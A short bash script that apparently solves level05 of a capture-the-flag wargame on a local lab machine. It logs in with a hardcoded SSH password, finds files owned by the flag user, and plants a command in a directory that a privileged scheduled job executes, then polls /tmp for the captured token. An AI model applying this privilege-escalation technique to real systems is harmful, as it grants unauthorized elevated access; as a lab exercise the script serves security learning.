#!/bin/bash

ssh() {
    sshpass -p 'ne2searoevaevoem4ov4ar8ap' ssh level05@localhost -p 2220 "$1"  
}
#token viuaaale9huek52boumoomioc

ssh 'find / -user flag05 2>/dev/null'

ssh 'cat /usr/sbin/openarenaserver'

ssh 'getfacl /opt/openarenaserver'

ssh "echo 'getflag > /tmp/flag05' > /opt/openarenaserver/getflag.sh"

while true; do
    ssh "cat /tmp/flag05 2>/dev/null"
    sleep 5
done

#Check flag.Here is your token : viuaaale9huek52boumoomioc